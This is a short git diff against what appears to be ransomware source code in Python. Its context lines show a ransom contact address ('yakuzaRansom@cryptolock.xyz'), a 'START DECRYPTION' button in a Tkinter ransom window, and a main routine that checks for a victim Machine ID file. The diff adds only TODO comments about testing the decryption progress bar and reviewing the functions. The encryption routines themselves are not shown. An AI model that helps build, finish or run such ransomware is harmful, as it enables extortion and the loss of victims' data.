@@ -796,6 +796,8 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         Button(keyFrame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica CE', 12), relief=FLAT,
                command=self.start_decryption).pack(side=RIGHT, padx=(10, 0))
 
+    # TODO:
+    #  1. Check Progressbar for decryption | 2. Check auto close app after decryption
     # Function to Setting UP the progress frame
     def setup_progress_frame(self):
         # Create Progress frame
@@ -1176,6 +1178,10 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
 """ Part 10: Main Execution 
 Only Step 57 """
+
+# TODO:
+#  3. Check all functions and classed based on the source code
+
 
 if __name__ == "__main__":
     # Step 57: Check if the Machine ID file exists
